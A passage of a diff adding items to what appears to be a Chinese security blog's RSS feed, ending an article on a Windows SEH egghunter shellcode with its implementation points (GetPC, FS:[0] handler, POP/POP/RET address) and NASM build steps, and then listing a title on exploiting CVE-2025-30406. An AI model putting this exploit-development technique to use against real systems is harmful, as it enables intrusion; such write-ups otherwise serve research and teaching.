+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;JMP&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;EDI&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;实现要点&#34;&gt;实现要点
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;使用GetPC技术动态定位处理程序地址&lt;/li&gt;
+&lt;li&gt;构建5层特殊栈结构实现异常处理链&lt;/li&gt;
+&lt;li&gt;需要非SafeSEH保护的POP/POP/RET指令地址&lt;/li&gt;
+&lt;li&gt;通过FS:[0]注册自定义SEH处理程序&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;使用说明&#34;&gt;使用说明
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;使用NASM编译：&lt;code&gt;nasm -o egghunter.obj egghunter.nasm&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;转换为Shellcode：&lt;code&gt;python bin2hex.py egghunter.obj&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;最终Shellcode需替换\x44\x44\x44\x44为实际POP/POP/RET地址&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;未来展望&#34;&gt;未来展望
+&lt;/h2&gt;&lt;p&gt;随着Windows 10成为&amp;quot;最后&amp;quot;的Windows版本，Egghunter的兼容性可能更持久。但作者仍建议优先考虑不使用Egghunter的利用方案。&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Gladinet Centrestack硬编码加密密钥漏洞利用分析(CVE-2025-30406)</title>
         <link>http://localhost:1313/p/gladinet-centrestack%E7%A1%AC%E7%BC%96%E7%A0%81%E5%8A%A0%E5%AF%86%E5%AF%86%E9%92%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90cve-2025-30406/</link>
         <pubDate>Mon, 04 Aug 2025 19:06:14 +0800</pubDate>
